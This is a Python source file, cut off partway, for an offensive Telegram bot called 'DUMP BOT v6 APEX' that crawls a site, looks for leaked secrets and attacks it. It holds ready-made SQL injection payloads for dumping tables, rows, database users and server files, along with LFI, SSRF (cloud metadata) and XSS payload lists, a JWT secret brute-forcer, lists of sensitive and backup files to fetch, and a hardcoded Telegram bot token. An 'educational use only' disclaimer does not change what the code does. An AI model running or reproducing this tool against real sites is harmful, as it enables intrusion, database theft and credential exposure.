#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🤖 TELEGRAM DUMP BOT - POWER EDITION v6 "APEX"
================================================
Modules : crawler async, WAF detect, JS deobfuscation, subdomain enum,
          API discovery, git leak, JWT decode+bruteforce, SQLi multi-tech,
          XSS, LFI, SSRF, CVE lookup (NVD), DB DUMP RÉEL, webshell detect,
          file read via SQLi, DB user enum, risk scoring, SQLite history,
          HTML report v6, PDF export.

⚠️ Usage éducatif uniquement — UNIQUEMENT sur TES sites.
"""

import os
import re
import sys
import json
import time
import base64
import zipfile
import sqlite3
import hashlib
import random
import string
import hmac
import socket
import threading
import traceback
from urllib.parse import urljoin, urlparse, quote, unquote, parse_qs, urlencode
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system(f"{sys.executable} -m pip install requests")
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system(f"{sys.executable} -m pip install beautifulsoup4")
    from bs4 import BeautifulSoup


# =================================================================
# CONFIG
# =================================================================
TELEGRAM_TOKEN   = os.getenv("8951245603:AAHG8Zgdv7UNVYpCZA704ptfC9pWhEAIo4c", "")
ALLOWED_CHAT_IDS = [x.strip() for x in os.getenv("ALLOWED_CHAT_IDS", "").split(",") if x.strip()]
MAX_ZIP_MB       = int(os.getenv("MAX_ZIP_MB", "40"))
MAX_IMG          = int(os.getenv("MAX_IMG", "30"))
MAX_OTHER        = int(os.getenv("MAX_OTHER", "50"))
MAX_FILE_SIZE_MB = int(os.getenv("MAX_FILE_SIZE_MB", "20"))
DOWNLOAD_DELAY   = float(os.getenv("DOWNLOAD_DELAY", "0.05"))
CRAWL_DEPTH      = int(os.getenv("CRAWL_DEPTH", "2"))
CRAWL_BREADTH    = int(os.getenv("CRAWL_BREADTH", "200"))
MAX_PAGES        = int(os.getenv("MAX_PAGES", "200"))
JS_DEPTH         = int(os.getenv("JS_DEPTH", "3"))
GLOBAL_THREADS   = int(os.getenv("GLOBAL_THREADS", "20"))
SUBDOMAIN_ENUM   = os.getenv("SUBDOMAIN_ENUM", "1") == "1"
XSS_LFI_SCAN     = os.getenv("XSS_LFI_SCAN", "1") == "1"
DB_PATH          = os.getenv("DB_PATH", "/tmp/dumpbot_history.db")

SQLI_THREADS     = int(os.getenv("SQLI_THREADS", "15"))
SQLI_TIMEOUT     = int(os.getenv("SQLI_TIMEOUT", "10"))
SQLI_SLEEP       = int(os.getenv("SQLI_SLEEP", "5"))
SQLI_ENABLED     = os.getenv("SQLI_ENABLED", "1") == "1"

DB_DUMP_ENABLED    = os.getenv("DB_DUMP_ENABLED", "1") == "1"
DB_DUMP_MAX_TABLES = int(os.getenv("DB_DUMP_MAX_TABLES", "30"))
DB_DUMP_MAX_ROWS   = int(os.getenv("DB_DUMP_MAX_ROWS", "100"))
DB_DUMP_MAX_COLS   = int(os.getenv("DB_DUMP_MAX_COLS", "20"))

CVE_LOOKUP_ENABLED = os.getenv("CVE_LOOKUP_ENABLED", "1") == "1"
JWT_BRUTE_ENABLED  = os.getenv("JWT_BRUTE_ENABLED", "1") == "1"
SSRF_SCAN_ENABLED  = os.getenv("SSRF_SCAN_ENABLED", "1") == "1"
PDF_EXPORT_ENABLED = os.getenv("PDF_EXPORT_ENABLED", "1") == "1"


def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{level}] {msg}", flush=True)


# =================================================================
# REGEX
# =================================================================
RE_URL     = re.compile(r'https?://[^\s<>"\')\]]+', re.IGNORECASE)
RE_JS_SRC  = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE)
RE_LINK    = re.compile(r'<link[^>]+href=["\']([^"\']+)["\']', re.IGNORECASE)
RE_IFRAME  = re.compile(r'<iframe[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE)
RE_IMG     = re.compile(r'<img[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE)
RE_ANY_URL = re.compile(r'["\']((?:https?:)?//[^"\']+\.(?:js|json|css|map|txt|xml|php|wasm|sql|env|bak|old|gz|zip|tar|7z|rar|log|conf|yml|yaml|toml|ini))["\']', re.IGNORECASE)
RE_PHP     = re.compile(r'["\']([^"\']+\.php(?:[?#][^"\']*)?)["\']', re.IGNORECASE)
RE_PHP_ANY = re.compile(r'([a-zA-Z0-9_\-./]+\.php)', re.IGNORECASE)
RE_INTERNAL_LINK = re.compile(r'href=["\']([^"\'#]+)["\']', re.IGNORECASE)

RE_API_ENDPOINTS = re.compile(
    r'["\'](/[a-zA-Z0-9_\-./]*(?:api|graphql|rest|v[0-9]|endpoint|query|mutation|rpc|soap|ws)[a-zA-Z0-9_\-./?=&]*)["\']',
    re.IGNORECASE)
RE_FETCH_AXIOS = re.compile(
    r'(?:fetch|axios\.(?:get|post|put|delete|patch)|\.ajax|\$\.(?:get|post))\s*\(\s*["\']([^"\']+)["\']',
    re.IGNORECASE)
RE_WS_URLS = re.compile(r'wss?://[^\s"\'<>()\\`]+', re.IGNORECASE)
RE_API_URL_IN_JS = re.compile(
    r'["\'](https?://[^"\']*(?:api|graphql|socket|ws)[^"\']*)["\']', re.IGNORECASE)

RE_SECRETS = re.compile(
    r'["\']?(?:api[_-]?key|apikey|secret|token|password|passwd|pwd|auth|'
    r'access[_-]?key|private[_-]?key|client[_-]?secret|jwt[_-]?secret|'
    r'aws[_-]?access|aws[_-]?secret|db[_-]?pass|database[_-]?pass|'
    r'redis[_-]?pass|smtp[_-]?pass|mail[_-]?pass|sendgrid|mailgun|twilio)["\']?'
    r'\s*[:=]\s*["\']([^"\']{6,120})["\']', re.IGNORECASE)
RE_BEARER = re.compile(r'Bearer\s+([A-Za-z0-9\-._~+/]{20,})', re.IGNORECASE)
RE_JWT = re.compile(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')
RE_GOOGLE_API = re.compile(r'AIza[0-9A-Za-z_\-]{35}')
RE_AWS_KEY = re.compile(r'AKIA[0-9A-Z]{16}')
RE_STRIPE = re.compile(r'(?:sk|pk|rk)_(?:live|test)_[0-9a-zA-Z]{24,}')
RE_PRIVATE_KEY = re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----')
RE_GITHUB_TOKEN = re.compile(r'gh[pousr]_[A-Za-z0-9_]{36,}')
RE_SLACK_TOKEN = re.compile(r'xox[baprs]-[0-9a-zA-Z\-]{10,}')
RE_DISCORD_TOKEN = re.compile(r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}')
RE_TWILIO_SID = re.compile(r'AC[a-f0-9]{32}')
RE_SENDGRID = re.compile(r'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}')

RE_JS_EVAL = re.compile(r'eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*[dr]\s*\)', re.IGNORECASE)
RE_JS_HEX = re.compile(r'(?:\\x[0-9a-f]{2}){8,}', re.IGNORECASE)
RE_JS_B64 = re.compile(r'atob\s*\(\s*["\']([A-Za-z0-9+/=]{20,})["\']\s*\)')
RE_JS_UNICODE = re.compile(r'(?:\\u[0-9a-f]{4}){6,}', re.IGNORECASE)

RE_VERSION_PATTERNS = [
    (r'wordpress[\s/]+([\d.]+)', "WordPress"),
    (r'wp-includes[^\'"]*\?ver=([\d.]+)', "WordPress"),
    (r'jquery[^\'"]*?([\d]+\.[\d]+\.[\d]+)', "jQuery"),
    (r'bootstrap[^\'"]*?([\d]+\.[\d]+\.[\d]+)', "Bootstrap"),
    (r'react[^\'"]*?([\d]+\.[\d]+\.[\d]+)', "React"),
    (r'vue[^\'"]*?([\d]+\.[\d]+\.[\d]+)', "Vue.js"),
    (r'angular[^\'"]*?([\d]+\.[\d]+\.[\d]+)', "Angular"),
    (r'php[\s/]+([\d.]+)', "PHP"),
    (r'apache[\s/]+([\d.]+)', "Apache"),
    (r'nginx[\s/]+([\d.]+)', "Nginx"),
    (r'drupal[\s/]+([\d.]+)', "Drupal"),
    (r'joomla[\s/]+([\d.]+)', "Joomla"),
    (r'laravel[\s/]+([\d.]+)', "Laravel"),
    (r'django[\s/]+([\d.]+)', "Django"),
]

WEBSHELL_SIGNATURES = {
    "c99":        [r"c99shell", r"c99_", r"c99\s+shell"],
    "r57":        [r"r57shell", r"r57_"],
    "b374k":      [r"b374k"],
    "wso":        [r"WSO\s*\d", r"wso_"],
    "alfa":       [r"ALFA\s*Team", r"alfa-shell"],
    "indoxploit": [r"IndoXploit"],
    "webshell":   [r"webshell", r"WebShell\s+by"],
    "anima":      [r"AnimaShell", r"anima-shell"],
}

JWT_WORDLIST = [
    "secret", "password", "jwt", "jwt_secret", "jwtsecret", "secret_key",
    "secretkey", "changeme", "admin", "test", "dev", "development",
    "production", "key", "mysecret", "my_secret", "supersecret",
    "supersecretkey", "keyboard_cat", "your-256-bit-secret",
    "your_jwt_secret", "jwt_key", "authentication", "auth", "token",
    "s3cr3t", "s3cr3t_key", "12345", "123456", "1234567890",
    "qwerty", "azerty", "letmein", "welcome", "root", "toor",
    "admin123", "password123", "passw0rd", "P@ssw0rd",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/", "http://127.0.0.1:80/",
    "http://127.0.0.1:443/", "http://127.0.0.1:22/",
    "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/", "http://100.100.100.200/",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:6379/INFO",
]

SSRF_INTERNAL_PATTERNS = [
    r"root:x:\d+:\d+:", r"\[extensions\]", r"ami-id", r"instance-id",
    r"computeMetadata", r"redis_version", r"mysql.*version",
]

FP_TECH = {
    "React": [r'react(?:\.min)?\.js', r'__REACT_DEVTOOLS'],
    "Vue.js": [r'vue(?:\.min)?\.js', r'__vue__'],
    "Angular": [r'angular(?:\.min)?\.js', r'ng-version'],
    "jQuery": [r'jquery(?:-\d+\.\d+\.\d+)?(?:\.min)?\.js'],
    "Bootstrap": [r'bootstrap(?:\.min)?\.(?:js|css)'],
    "Tailwind": [r'tailwindcss'],
    "Next.js": [r'__NEXT_DATA__', r'/_next/static/'],
    "Nuxt.js": [r'__NUXT__', r'/_nuxt/'],
    "WordPress": [r'wp-content', r'wp-includes'],
    "Drupal": [r'drupal', r'sites/default/files'],
    "Joomla": [r'/components/com_'],
    "Laravel": [r'laravel_session', r'XSRF-TOKEN'],
    "Django": [r'csrftoken'],
    "Shopify": [r'cdn\.shopify\.com'],
    "Cloudflare": [r'cloudflare', r'cf-ray'],
    "Vercel": [r'x-vercel', r'vercel\.app'],
}

WAF_SIGNATURES = {
    "Cloudflare": [r'cf-ray', r'cloudflare'],
    "Akamai": [r'akamai'],
    "Sucuri": [r'x-sucuri', r'sucuri\.net'],
    "Imperva": [r'incap_ses', r'visid_incap'],
    "F5 BIG-IP": [r'bigipserver'],
    "AWS WAF": [r'awselb', r'x-amzn-requestid'],
    "ModSecurity": [r'mod_security'],
    "Wordfence": [r'wordfence'],
    "Fortinet": [r'fortiweb'],
    "Fastly": [r'fastly'],
}


# =================================================================
# LISTES
# =================================================================
PHP_BACKUP_SUFFIXES = ["", ".bak", ".old", ".orig", ".save", ".copy", ".tmp", ".swp", ".swo",
    "~", ".txt", ".html", ".zip", ".tar.gz", "%00", "%00.php", "::$DATA",
    ".php.bak", ".php~", ".php.old", ".php.orig", ".php.save", ".php.swp", ".phps",
    ".1", ".2", ".bak1", ".bak2", ".2019", ".2020", ".2021", ".2022", ".2023", ".2024"]

SENSITIVE_FILES = [
    ".env", ".env.local", ".env.prod", ".env.production", ".env.dev", ".env.staging",
    ".env.test", ".env.backup", ".env.example", ".env.bak", ".env.old", ".env.dist",
    "config.php", "configuration.php", "config.inc.php", "config.ini",
    "settings.php", "database.php", "db.php", "db_config.php",
    "connection.php", "connexion.php", "credentials.php",
    "composer.json", "composer.lock", "package.json", "package-lock.json",
    "yarn.lock", "Gemfile", "Gemfile.lock", "requirements.txt", "Pipfile",
    ".gitignore", ".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD",
    ".svn/entries", ".hg/hgrc",
    "backup.sql", "dump.sql", "database.sql", "db.sql",
    "admin.php", "login.php", "wp-config.php", "wp-config.php.bak",
    "wp-login.php", "phpinfo.php", "info.php", "test.php",
    "error.log", "access.log", "debug.log", "app.log",
    "readme.md", "README.md", "robots.txt", "sitemap.xml",
    ".htaccess", ".htpasswd", "web.config",
    "api.php", "api/index.php", "api/config.php",
    "swagger.json", "openapi.json", "api-docs", "graphql", "graphiql",
    "server-status", "server-info", ".DS_Store", "Thumbs.db",
    "deploy.php", "install.php", "setup.php", "upgrade.php",
    "shell.php", "cmd.php", "webshell.php", "c99.php", "r57.php",
    "actuator", "actuator/health", "actuator/env", "actuator/beans",
    "docker-compose.yml", "Dockerfile", ".dockerignore",
    "terraform.tfstate", "id_rsa", ".ssh/id_rsa",
]

DB_BACKUP_FILES = [
    "backup.sql", "backup.sql.gz", "backup.sql.zip", "backup.sql.bak",
    "dump.sql", "dump.sql.gz", "dump.sql.zip",
    "database.sql", "database.sql.gz", "db.sql", "db.sql.gz",
    "site.sql", "www.sql", "public.sql", "mysql.sql", "data.sql",
    "export.sql", "sql_backup.sql", "bdd.sql", "base.sql",
    "backup_db.sql", "backup_database.sql", "old.sql", "old_db.sql",
    "db_backup.zip", "database_backup.zip", "backup.tar.gz", "backup.rar",
    "admin/backup.sql", "backup/backup.sql", "data/backup.sql",
    "wp-content/backup.sql", "private/backup.sql", "storage/backup.sql",
    "sql/backup.sql", "database/backup.sql", "db/backup.sql",
    "backup-2023.sql", "backup-2024.sql", "backup-2025.sql",
    "prod.sql", "production.sql", "live.sql", "master.sql",
    "migration.sql", "schema.sql", "structure.sql",
]

DB_ADMIN_TOOLS = [
    "phpmyadmin/", "phpMyAdmin/", "pma/",
    "adminer.php", "adminer/", "adminer-4.8.1.php", "adminer-5.0.0.php",
    "mysql/", "mysqladmin/", "sqladmin/", "dbadmin/",
    "mywebsql/", "webadmin.php", "sqlbuddy/", "sqlite/",
]

ENV_DB_KEYS = [
    "DB_HOST", "DB_PORT", "DB_DATABASE", "DB_USERNAME", "DB_PASSWORD",
    "DATABASE_URL", "MYSQL_HOST", "MYSQL_USER", "MYSQL_PASSWORD",
    "POSTGRES_HOST", "POSTGRES_USER", "POSTGRES_PASSWORD",
    "MONGO_URL", "REDIS_URL", "REDIS_PASSWORD", "SECRET_KEY", "APP_KEY",
    "JWT_SECRET", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
]

SUBDOMAIN_WORDLIST = [
    "www", "api", "app", "admin", "portal", "dashboard", "mail", "smtp",
    "ftp", "sftp", "ssh", "vpn", "dev", "staging", "test", "qa", "demo",
    "beta", "alpha", "cdn", "static", "assets", "img", "media", "blog",
    "shop", "store", "pay", "payment", "secure", "login", "auth", "sso",
    "support", "help", "docs", "wiki", "git", "gitlab", "github", "ci",
    "jenkins", "grafana", "prometheus", "kibana", "elastic", "redis",
    "mysql", "postgres", "mongo", "db", "database", "backup", "internal",
    "intranet", "extranet", "partner", "client", "crm", "erp", "hr",
]

LFI_PAYLOADS = [
    "../../../etc/passwd", "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini", "....//....//....//windows/win.ini",
    "/etc/passwd", "/etc/shadow", "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>", "javascript:alert(1)",
    "\"onmouseover=\"alert(1)", "'-alert(1)-'",
]

SQLI_ERROR_PAYLOADS = [
    "'", "\"", "')", "';", "\")", "`", "\\", "'--", "'#", "'/*",
    "1'", "1\"", "1`)", "1'))",
]
SQLI_BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
]
SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP({s})-- -", "mysql"),
    ("' AND pg_sleep({s})-- -", "postgres"),
    ("'; WAITFOR DELAY '0:0:{s}'-- -", "mssql"),
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{s})-- -", "oracle"),
]

DB_FINGERPRINT_PAYLOADS = {
    "mysql": [
        "1' UNION SELECT 1,CONCAT(0x7e,version(),0x7e),3-- -",
        "1' UNION SELECT 1,CONCAT(0x7e,user(),0x7e),3-- -",
        "1' UNION SELECT 1,CONCAT(0x7e,database(),0x7e),3-- -",
    ],
    "postgres": [
        "1' UNION SELECT 1,version(),3-- -",
        "1' UNION SELECT 1,current_user,3-- -",
    ],
    "mssql": [
        "1' UNION SELECT 1,@@version,3-- -",
        "1' UNION SELECT 1,SYSTEM_USER,3-- -",
    ],
}

DB_TABLES_PAYLOADS = {
    "mysql": [
        "1' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR 0x7c),3 FROM information_schema.tables WHERE table_schema=database()-- -",
        "1' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR 0x7c),3 FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys')-- -",
    ],
    "postgres": [
        "1' UNION SELECT 1,string_agg(tablename, '|'),3 FROM pg_tables WHERE schemaname='public'-- -",
    ],
    "mssql": [
        "1' UNION SELECT 1,STRING_AGG(name, '|'),3 FROM sys.tables-- -",
    ],
}

DB_COLUMNS_PAYLOADS = {
    "mysql": "1' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR 0x7c),3 FROM information_schema.columns WHERE table_name='{table}'-- -",
    "postgres": "1' UNION SELECT 1,string_agg(column_name, '|'),3 FROM information_schema.columns WHERE table_name='{table}'-- -",
    "mssql": "1' UNION SELECT 1,STRING_AGG(name, '|'),3 FROM sys.columns WHERE object_id=OBJECT_ID('{table}')-- -",
}

DB_DATA_PAYLOADS = {
    "mysql": "1' UNION SELECT 1,GROUP_CONCAT(CONCAT_WS(0x7c,{cols}) SEPARATOR 0x0a),3 FROM {table} LIMIT {n}-- -",
    "postgres": "1' UNION SELECT 1,string_agg(CONCAT_WS('|',{cols}), E'\\n'),3 FROM {table} LIMIT {n}-- -",
    "mssql": "1' UNION SELECT 1,STRING_AGG(CONCAT_WS('|',{cols}), CHAR(10)),3 FROM {table}-- -",
}

DB_FILEREAD_PAYLOADS = {
    "mysql": "1' UNION SELECT 1,LOAD_FILE('{path}'),3-- -",
    "postgres": "1' UNION SELECT 1,pg_read_file('{path}'),3-- -",
    "mssql": "1' UNION SELECT 1,BulkColumn,3 FROM OPENROWSET(BULK '{path}', SINGLE_CLOB) AS x-- -",
}

DB_USERS_PAYLOADS = {
    "mysql": "1' UNION SELECT 1,GROUP_CONCAT(CONCAT(user,0x3a,host) SEPARATOR 0x7c),3 FROM mysql.user-- -",
    "postgres": "1' UNION SELECT 1,string_agg(usename, '|'),3 FROM pg_user-- -",
    "mssql": "1' UNION SELECT 1,STRING_AGG(name, '|'),3 FROM sys.server_principals WHERE type IN ('S','U')-- -",
}


# =================================================================
# UTILS
# =================================================================
def sanitize(name, maxlen=100):
    name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', '_', name)
    if len(name) > maxlen:
        b, e = os.path.splitext(name)
        name = b[:maxlen - len(e) - 3] + "..." + e
    return name or "file"


def filename_from_url(url, fallback_ext=".html"):
    p = urlparse(url)
    path = p.path.strip("/") or "index"
    name = path.replace("/", "_")
    if p.query:
        name += "_" + hashlib.md5(p.query.encode()).hexdigest()[:8]
    if not os.path.splitext(name)[1]:
        name += fallback_ext
    return sanitize(name)


def save(path, content):
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    if isinstance(content, bytes):
        with open(path, "wb") as f:
            f.write(content)
    else:
        with open(path, "w", encoding="utf-8", errors="ignore") as f:
            f.write(content)


def build_headers(url, extra=None):
    p = urlparse(url)
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
        "Referer": f"{p.scheme}://{p.netloc}/",
    }
    if extra:
        headers.update(extra)
    return headers


def make_session():
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s


def looks_like_php_source(text):
    return any(ind in text for ind in ["<?php", "<?=", "<? ", "declare(strict_types",
        "namespace ", "use Illuminate", "use Symfony", "function ", "class ", "->", "=>"])


def looks_like_html(text):
    low = text[:2000].lower()
    return "<!doctype" in low or "<html" in low


def is_internal(url, origin):
    try:
        return urlparse(url).netloc == urlparse(origin).netloc
    except Exception:
        return False


def normalize_url(url):
    try:
        p = urlparse(url)
        path = p.path.rstrip("/") or "/"
        return f"{p.scheme}://{p.netloc}{path}"
    except Exception:
        return url


def decode_jwt(token):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        def b64(s):
            s += "=" * (-len(s) % 4)
            return base64.urlsafe_b64decode(s).decode("utf-8", errors="ignore")
        return {
            "header": json.loads(b64(parts[0])),
            "payload": json.loads(b64(parts[1])),
            "signature_len": len(parts[2]),
        }
    except Exception:
        return None


# =================================================================
# HISTORY DB
# =================================================================
class HistoryDB:
    def __init__(self, path=DB_PATH):
        self.path = path
        self._init()

    def _init(self):
        try:
            with sqlite3.connect(self.path) as c:
                c.execute("""CREATE TABLE IF NOT EXISTS scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT, started TEXT, finished TEXT, duration INTEGER,
                    files INTEGER, size_mb REAL, secrets INTEGER,
                    sqli INTEGER, xss INTEGER, lfi INTEGER, ssrf INTEGER,
                    db_tables INTEGER, db_rows INTEGER, cves INTEGER,
                    risk_score TEXT, waf TEXT, report TEXT
                )""")
        except Exception as e:
            log(f"DB init error: {e}", "ERROR")

    def add(self, data):
        try:
            with sqlite3.connect(self.path) as c:
                c.execute("""INSERT INTO scans (url, started, finished, duration,
                    files, size_mb, secrets, sqli, xss, lfi, ssrf,
                    db_tables, db_rows, cves, risk_score, waf, report)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (data.get("url"), data.get("started"), data.get("finished"),
                     data.get("duration", 0), data.get("files", 0),
                     data.get("size_mb", 0.0), data.get("secrets", 0),
                     data.get("sqli", 0), data.get("xss", 0), data.get("lfi", 0),
                     data.get("ssrf", 0), data.get("db_tables", 0),
                     data.get("db_rows", 0), data.get("cves", 0),
                     data.get("risk_score", "?"), data.get("waf", ""),
                     data.get("report", "")))
        except Exception as e:
            log(f"DB add error: {e}", "ERROR")

    def recent(self, n=10):
        try:
            with sqlite3.connect(self.path) as c:
                return c.execute("SELECT * FROM scans ORDER BY id DESC LIMIT ?", (n,)).fetchall()
        except Exception:
            return []

    def stats(self):
        try:
            with sqlite3.connect(self.path) as c:
                return c.execute("""SELECT COUNT(*), SUM(files), SUM(size_mb),
                    SUM(secrets), SUM(sqli), SUM(xss), SUM(lfi), SUM(db_tables)
                    FROM scans""").fetchone() or (0,)*8
        except Exception:
            return (0,)*8


# =================================================================
# CVE LOOKUP
# =================================================================
_cve_cache = {}

def lookup_cves(product, version, max_results=10):
    cache_key = f"{product}:{version}"
    if cache_key in _cve_cache:
        return _cve_cache[cache_key]
    try:
        params = {"keywordSearch": f"{product} {version}", "resultsPerPage": max_results}
        r = requests.get("https://services.nvd.nist.gov/rest/json/cves/2.0",
                        params=params, timeout=20)
        if r.status_code != 200:
            _cve_cache[cache_key] = []
            return []
        data = r.json()
        results = []
        for item in data.get("vulnerabilities", [])[:max_results]:
            cve = item.get("cve", {})
            cve_id = cve.get("id", "?")
            desc = ""
            for d in cve.get("descriptions", []):
                if d.get("lang") == "en":
                    desc = d.get("value", "")[:200]
                    break
            metrics = cve.get("metrics", {})
            score = None
            severity = "?"
            for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                if key in metrics:
                    m = metrics[key][0]
                    score = m.get("cvssData", {}).get("baseScore")
                    severity = m.get("cvssData", {}).get("baseSeverity",
                                                          m.get("baseSeverity", "?"))
                    break
            results.append({"id": cve_id, "description": desc,
                            "score": score, "severity": severity})
        _cve_cache[cache_key] = results
        return results
    except Exception as e:
        log(f"CVE lookup error {product} {version}: {e}", "ERROR")
        _cve_cache[cache_key] = []
        return []


def detect_versions(text, headers):
    versions = {}
    full_text = text + " " + " ".join([f"{k}: {v}" for k, v in headers.items()])
    for pattern, product in RE_VERSION_PATTERNS:
        matches = re.findall(pattern, full_text, re.IGNORECASE)
        if matches:
            v = matches[0] if isinstance(matches[0], str) else matches[0][0]
            versions[product] = v
    server = headers.get("Server", "")
    m = re.search(r'([A-Za-z\-]+)/([\d.]+)', server)
    if m:
        versions[m.group(1)] = m.group(2)
    powered = headers.get("X-Powered-By", "")
    m = re.search(r'([A-Za-z\-]+)/([\d.]+)', powered)
    if m:
        versions[m.group(1)] = m.group(2)
    return versions


# =================================================================
# JWT BRUTE-FORCE
# =================================================================
def jwt_bruteforce(token):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header_b64, payload_b64, sig_b64 = parts
        hdr = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4)))
        alg = hdr.get("alg", "HS256").upper()
        if alg not in ("HS256", "HS384", "HS512"):
            return {"error": f"Algo {alg} non supporté"}
        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hashfn = hash_map[alg]
        message = f"{header_b64}.{payload_b64}".encode()
        target_sig = base64.urlsafe_b64decode(sig_b64 + "=" * (-len(sig_b64) % 4))
        for secret in JWT_WORDLIST:
            try:
                computed = hmac.new(secret.encode(), message, hashfn).digest()
                if hmac.compare_digest(computed, target_sig):
                    return {"secret": secret, "alg": alg, "found": True}
            except Exception:
                continue
        return {"found": False, "tried": len(JWT_WORDLIST), "alg": alg}
    except Exception as e:
        return {"error": str(e)}


# =================================================================
# SSRF
# =================================================================
def detect_ssrf(url, param, session):
    findings = []
    for payload in SSRF_PAYLOADS:
        try:
            r = session.get(url, params={param: payload},
                          headers=build_headers(url), timeout=8, allow_redirects=False)
            if r.status_code not in (200, 301, 302, 500):
                continue
            body = r.text[:5000]
            for pattern in SSRF_INTERNAL_PATTERNS:
                m = re.search(pattern, body, re.IGNORECASE)
                if m:
                    findings.append({"type": "ssrf", "param": param,
                                    "payload": payload,
                                    "evidence": m.group(0)[:120],
                                    "severity": "CRITICAL"})
                    break
        except Exception:
            pass
    return findings


def run_ssrf_scan(base_url, notify_fn=None):
    if not SSRF_SCAN_ENABLED:
        return []
    def notify(msg):
        if notify_fn:
            notify_fn(msg)
    notify("🌐 <b>Scan SSRF...</b>")
    session = make_session()
    urls = extract_urls_with_params(base_url, session)
    findings = []
    for url in urls[:15]:
        parsed = urlparse(url)
        params = [p.split("=")[0] for p in parsed.query.split("&") if "=" in p]
        clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in params:
            f = detect_ssrf(clean, param, session)
            for x in f:
                x["url"] = clean
                findings.append(x)
    if findings:
        notify(f"🚨 <b>{len(findings)} SSRF détectée(s)</b>")
    return findings


# =================================================================
# WEBSHELL
# =================================================================
def detect_webshells(paths_content):
    findings = []
    for path, content in paths_content:
        if isinstance(content, bytes):
            content = content.decode("utf-8", errors="ignore")
        for shell_name, patterns in WEBSHELL_SIGNATURES.items():
            for pat in patterns:
                if re.search(pat, content, re.IGNORECASE):
                    findings.append({"file": path, "shell": shell_name,
                                    "signature": pat, "severity": "CRITICAL"})
                    break
    return findings


# =================================================================
# DB DUMPER
# =================================================================
class DBDumper:
    MARKER = "DUMPBOTX"

    def __init__(self, url, param, session, notify_fn=None):
        self.url = url
        self.param = param
        self.session = session
        self.notify = notify_fn or (lambda x: None)
        self.db_type = None
        self.num_columns = None
        self.tables = []
        self.evidence = []

    def _get(self, payload, timeout=SQLI_TIMEOUT):
        try:
            return self.session.get(self.url, params={self.param: payload},
                                    headers=build_headers(self.url),
                                    timeout=timeout, allow_redirects=False)
        except Exception:
            return None

    def find_num_columns(self, max_cols=15):
        last_ok = 0
        for n in range(1, max_cols + 1):
            payload = f"1' ORDER BY {n}-- -"
            r = self._get(payload)
            if r is None:
                continue
            if r.status_code == 500 or re.search(
                r"unknown column|order by|out of range", r.text, re.IGNORECASE):
                break
            last_ok = n
        if last_ok:
            self.num_columns = last_ok
            return last_ok
        return None

    def fingerprint_db(self):
        error_map = {
